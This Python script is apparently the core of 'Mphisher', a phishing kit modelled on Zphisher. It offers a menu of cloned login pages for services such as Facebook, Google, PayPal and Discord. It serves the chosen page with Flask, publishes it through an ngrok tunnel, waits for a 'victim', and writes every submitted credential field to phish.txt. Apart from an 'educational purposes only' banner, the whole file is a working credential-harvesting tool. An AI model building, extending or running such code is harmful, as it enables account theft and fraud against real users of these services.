# Importation des librairies installées
from rich.console import Console
from rich.prompt import Prompt
from pyngrok import ngrok
from dotenv import load_dotenv
import os
from flask import Flask, request, send_from_directory
import threading


# Configuration & Initialisation de base
load_dotenv()
console = Console()
app = Flask(__name__)
received_data = False
current_site = "facebook"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))


# Affiche les informations, le menu & les commandes relatifs au script
def showInformation():
    console.print(r'''[yellow]
     ___  ___       _     _     _
    |   \/   |     | |   (_)   | |
    |  \  /  |_ __ | |__  _ ___| |__   ___ _ __
    |  |\/|  | '_ \| '_ \| / __| '_ \ / _ \ '__|
    |  |  |  | |_) | | | | \__ \ | | |  __/ |
    |__|  |__| .__/|_| |_|_|___/_| |_|\___|_|
             | |
             |_|[/yellow]               [red]Version 1.0[/red]
    ''')
    console.print('[yellow][+][/yellow] [cyan]Tool Created by Blackholeisoka (github)[/cyan]')
    console.print('')
    console.print('.:.[yellow] Select Any Attack for your Victim [/yellow].:.')
    console.print('')
    console.print('[red][[/red][white]01[/white][red]][/red] [yellow]Facebook[/yellow]    [red][[/red][white]05[/white][red]][/red] [yellow]Microsoft[/yellow]  [red][[/red][white]09[/white][red]][/red] [yellow]Steam[/yellow]')
    console.print('[red][[/red][white]02[/white][red]][/red] [yellow]Instagram[/yellow]   [red][[/red][white]06[/white][red]][/red] [yellow]Google[/yellow]     [red][[/red][white]10[/white][red]][/red] [yellow]Twitter[/yellow]')
    console.print('[red][[/red][white]03[/white][red]][/red] [yellow]Snapchat[/yellow]    [red][[/red][white]07[/white][red]][/red] [yellow]Linkedin[/yellow]   [red][[/red][white]11[/white][red]][/red] [yellow]Paypal[/yellow]')
    console.print('[red][[/red][white]04[/white][red]][/red] [yellow]Twitch[/yellow]      [red][[/red][white]08[/white][red]][/red] [yellow]Github[/yellow]     [red][[/red][white]12[/white][red]][/red] [yellow]Discord[/yellow]')
    console.print('')
    console.print('[red][[/red][white]99[/white][red]][/red] [yellow]About[/yellow]       [red][[/red][white]00[/white][red]][/red] [yellow]Exit[/yellow]  ')
    console.print('')

showInformation()


# Quitte / Met fin au script
def exitScript():
    console.print('')
    console.print('Goodbye, [red]hacker[/red].')
    console.print('')
    exit()


# Affiche les informations sur le script 
def about():
    console.print("""
[cyan]╔══════════════════════════════════════════════════════════╗
║                    PACKAGE INFORMATION                   ║
╚══════════════════════════════════════════════════════════╝[/cyan]

[red][[/red]-[red]][/red] [yellow]Name:[/yellow]           Mphisher Pro Elite Edition
[red][[/red]-[red]][/red] [yellow]Version:[/yellow]        1.0.0
[red][[/red]-[red]][/red] [yellow]Author:[/yellow]         Blackholeisoka
[red][[/red]-[red]][/red] [yellow]GitHub:[/yellow]         github.com/Blackholeisoka
[red][[/red]-[red]][/red] [yellow]License:[/yellow]        MIT
[red][[/red]-[red]][/red] [yellow]Language:[/yellow]       Python 3.x

[red][[/red]-[red]][/red] [yellow]Created:[/yellow]        18-12-2025
[red][[/red]-[red]][/red] [yellow]Last Update:[/yellow]    18-12-2025

[red][[/red]-[red]][/red] [yellow]Audience:[/yellow]       Ethical hackers
[red][[/red]-[red]][/red] [yellow]Inspiration:[/yellow]    Zphisher

[red][[/red]-[red]][/red] [yellow]Keywords:[/yellow]
  #security #education #python #rich #terminal

[red][[/red]-[red]][/red] [yellow]Dependencies:[/yellow]
  • rich
  • flask
  • pyngrok
  • python-dotenv
  • os (intégré)
  • threading (intégré)

[red][[/red]-[red]][/red] [yellow]Warning:[/yellow] [red]For educational purposes only![/red]

[red][[/red]-[red]][/red] [cyan]Press ENTER to return to menu...[/cyan]
""")
    input()
    showInformation()
    promptShow()


# Route Flask pour servir le fichier index.html en racine
@app.route('/')
def serve_index():
    global current_site
    site_path = os.path.join(BASE_DIR, 'site', current_site)
    return send_from_directory(site_path, 'index.html')


# Route Flask pour servir les fichiers annexes (CSS, JS, images)
@app.route('/<path:path>')
def serve_static(path):
    global current_site
    site_path = os.path.join(BASE_DIR, 'site', current_site)
    return send_from_directory(site_path, path)


# Route Flask pour recevoir les données utilisateur via POST
@app.route('/user', methods=['POST'])
def save():
    global received_data
    data = request.get_json()
    
    console.print(f'\n[green][[/green]+[green]][/green] [yellow]Data received![/yellow]')
    phish_path = os.path.join(BASE_DIR, 'phish.txt')

    with open(phish_path, 'a') as f:
        f.write('\n=== NEW ENTRY ===\n')
        for key, value in data.items():
            f.write(f'{key}: {value}\n')
            console.print(f'[red][[/red]-[red]][/red] [cyan]{key}:[/cyan] {value}')
    
    received_data = True
    console.print(f'[green][[/green]+[green]][/green] [yellow]Saved to phish.txt[/yellow]\n')
    
    return '', 204


# Définit le port et lance le serveur Flask
def run_flask(port):
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)


# Héberge automatiquement la page web via ngrok
def serverConnection():
    global received_data
    received_data = False
    
    PORT = 5000
    token = os.getenv("NGROK_TOKEN")
    ngrok.set_auth_token(str(token))
    
    flask_thread = threading.Thread(target=run_flask, args=(PORT,), daemon=True)
    flask_thread.start()
    
    public_url = ngrok.connect(str(PORT))
    
    console.print(f'[red][[/red]-[red]][/red] [yellow]Website on internet:[/yellow] [red]{public_url}[/red]')
    console.print('[red][[/red]-[red]][/red] [cyan]Waiting for victim connection...[/cyan]')
    console.print('[red][[/red]-[red]][/red] [yellow]Press Ctrl+C to stop manually[/yellow]\n')
    
    try:
        while not received_data:
            pass
    except KeyboardInterrupt:
        console.print('\n[yellow]Server stopped manually[/yellow]')
    
    ngrok.disconnect(str(public_url))
    console.print(f'[green][[/green]+[green]][/green] [yellow]Server stopped[/yellow]\n')
    promptShow()


# Vérifie si le dossier existe avant de lancer le serveur
def initWebsite(name):
    global current_site
    site_folder = os.path.join(BASE_DIR, 'site', name)
    
    if not os.path.exists(site_folder):
        console.print(f'[red]Error: Website folder not found:[/red] {name}')
        promptShow()
    else:
        current_site = name
        serverConnection()


# Écoute et valide l'entrée utilisateur
def promptShow():
    choice = Prompt.ask('[red][[/red]-[red]][/red] [cyan]Select an option[/cyan]')
    
    while not choice.isdigit() or choice not in siteIndex:
        console.print("[red]Invalid option[/red]")
        choice = Prompt.ask('[red][[/red]-[red]][/red] [cyan]Select an option[/cyan]')
    
    siteIndex[choice]()


# Dictionnaire associant chaque choix à une fonction avec le nom du dossier
siteIndex = {
    "01": lambda: initWebsite("facebook"),
    "02": lambda: initWebsite("instagram"),
    "03": lambda: initWebsite("snapchat"),
    "04": lambda: initWebsite("twitch"),
    "05": lambda: initWebsite("microsoft"),
    "06": lambda: initWebsite("google"),
    "07": lambda: initWebsite("linkedin"),
    "08": lambda: initWebsite("github"),
    "09": lambda: initWebsite("steam"),
    "10": lambda: initWebsite("twitter"),
    "11": lambda: initWebsite("paypal"),
    "12": lambda: initWebsite("discord"),
    "99": about,
    "00": exitScript,
}

promptShow()
